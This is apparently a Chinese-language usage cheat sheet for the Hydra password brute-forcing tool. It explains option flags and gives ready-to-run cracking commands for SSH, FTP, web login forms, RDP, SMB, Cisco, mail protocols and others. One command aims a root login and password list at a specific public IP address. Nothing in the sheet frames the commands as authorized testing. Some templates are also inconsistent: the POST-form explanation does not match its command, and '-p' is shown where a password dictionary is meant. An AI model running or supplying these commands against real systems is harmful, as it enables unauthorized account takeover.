# hydra是一款开源的暴力密码破解工具

支持多种协议密码的破解。

```
hydra -l root -P top500.txt  39.107.221.203  ssh
```



```
1.使用字典对目标服务进行破解。
hydra -L user.txt -P password.txt ssh://192.168.3.163

2.当目标服务开放的端口不是默认端口时，使用 -s 进行指定。
hydra -L user.txt -P password.txt ssh://192.168.3.163 -s 40

3.将破解的密码存储到指定文件。
hydra -L user.txt -P password.txt ssh://192.168.3.163 -s 40 -o ssh.txt
```

```
-R 还原以前中止或崩溃的会话

-S 使用SSL连接

-s 指定非默认端口

-l 使用登录名进行登录

-L 使用账号字典进行破解

-p 使用密码进行登录

-P 使用密码字典进行破解

-e nsr n:空密码破解 s：使用的user作为密码破解 r：反向登录

-C 指定所用格式为"user:password"字典文件

-M 指定破解的目标文件，如果不是默认端口，后面跟上": port"

-o 将破解成功的用户名：密码写入指定文件

-b 指定文件类型(txt (default)，json，jsonv1)

-f / -F 在找到用户名或密码时退出( -f 每个主机 -F 主机文件)

-t 设置每个目标并行连接数(默认为16)

-T 任务总体的并行连接数（默认为64）

-w /-W 设置超时时间(默认为32秒) 每个线程之间连接等待时间(默认为0)

-v / -V / -d 详细模式 / 显示login+pass 每个尝试 / 调试模式

-O 使用老版本SSL V2和V3

-q 不输出连接错误信息

-U 查看 支持破解的服务和协议

server 目标ip、某个网段

service 指定服务/协议名称

OPT 某些模块支持附加输入  
```



## hydra支持破解的服务/协议对应功能的参数模板

### 1、破解ssh：
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh

hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh

### 2、破解ftp：

hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV

hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV

### 3、get方式提交，破解web登录：

```
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip http-get /admin/
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f ip http-get /admin/index.php
```



### 4、post方式提交，破解web登录：
hydra -l 用户名 -P 密码字典 -s 80 ip

http-post-form “/admin/login.php:username=USER&password=PASS&submit=login:sorry password”

（参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解,
### 5、破解https：
hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https

### 6、破解teamspeak：
hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak

### 7、破解cisco：
hydra -P pass.txt 10.36.16.18 cisco

hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable

### 8、破解smb：
hydra -l administrator -P pass.txt 10.36.16.18 smb

### 9、破解pop3：
hydra -l muts -P pass.txt my.pop3.mail pop3

### 10、破解rdp：
hydra ip rdp -l administrator -P pass.txt -V

### 11、破解http-proxy：

hydra -l admin -P pass.txt http-proxy://10.36.16.18

### 12、破解imap：

hydra -L user.txt -p secret 10.36.16.18 imap PLAIN

hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN



